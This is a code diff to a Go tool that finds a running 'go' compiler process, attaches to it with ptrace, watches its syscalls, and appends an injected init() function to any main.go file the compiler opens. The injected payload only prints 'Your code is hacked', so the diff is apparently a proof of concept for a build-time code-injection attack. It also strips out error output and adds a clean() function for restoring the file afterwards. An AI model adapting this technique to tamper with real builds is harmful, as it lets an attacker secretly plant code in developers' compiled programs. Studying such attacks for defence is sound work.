@@ -4,8 +4,11 @@ import "C"
 
 import (
 	"fmt"
+	"io/ioutil"
+	"log"
 	"os"
 	"os/signal"
+	"strings"
 	"syscall"
 
 	ps "github.com/mitchellh/go-ps"
@@ -39,8 +42,6 @@ func findproc() {
 		exec := proc.Executable()
 
 		if exec == "go" {
-			fmt.Printf("Process Name: go")
-			fmt.Printf("Process PID: %d\n", proc.Pid())
 
 			eh, _ := os.FindProcess(proc.Pid())
 			exploit(eh.Pid)
@@ -54,10 +55,7 @@ func exploit(pid int) {
 	var err error
 	exit := true
 
-	err = syscall.PtraceAttach(pid)
-	if err != nil {
-		fmt.Printf(err.Error())
-	}
+	_ = syscall.PtraceAttach(pid)
 
 	for {
 		if exit {
@@ -68,14 +66,33 @@ func exploit(pid int) {
 
 			// Uncomment to show each syscall as it's called
 			name, _ := sec.ScmpSyscall(regs.Orig_rax).GetName()
+
+			if name == "close" {
+				closepath, err := getOpenAtPath(pid, regs)
+				if err != nil {
+					fmt.Println(err)
+				}
+
+				if strings.Contains(closepath, "main.go") {
+					fmt.Printf("Close")
+					fmt.Printf("Path: %s\n", closepath)
+					fmt.Printf("Name: %s\n", name)
+				}
+			}
+
 			if name == "openat" {
-				fmt.Printf("Name: %s\n", name)
 
 				path, err := getOpenAtPath(pid, regs)
 				if err != nil {
 					fmt.Println(err)
 				}
-				fmt.Printf("Path: %s", path)
+
+				if strings.Contains(path, "main.go") {
+					fmt.Printf("Path: %s\n", path)
+					fmt.Printf("Name: %s\n", name)
+					_ = patchfile(path)
+
+				}
 
 			}
 
@@ -83,18 +100,56 @@ func exploit(pid int) {
 
 		err = syscall.PtraceSyscall(pid, 0)
 		if err != nil {
-			fmt.Printf(err.Error())
 			break
 		}
 
 		_, err = syscall.Wait4(pid, nil, 0, nil)
 		if err != nil {
-			fmt.Printf(err.Error())
 			break
 		}
 
 		exit = !exit
 	}
+
+}
+
+func patchfile(path string) (original []byte) {
+	data, err := ioutil.ReadFile(path)
+	if err != nil {
+		fmt.Println(err)
+		return nil
+	}
+
+	fmt.Println(path)
+
+	// add init function
+	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return data
+	}
+
+	hackerstring := `
+func init() {
+	fmt.Println("Your code is hacked")
+}
+	`
+
+	if _, err := f.WriteString(hackerstring); err != nil {
+		log.Println(err)
+	}
+
+	return data
+
+}
+
+func clean(data []byte, path string) {
+	f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	f.Write(data)
+	f.Close()
 
 }
 
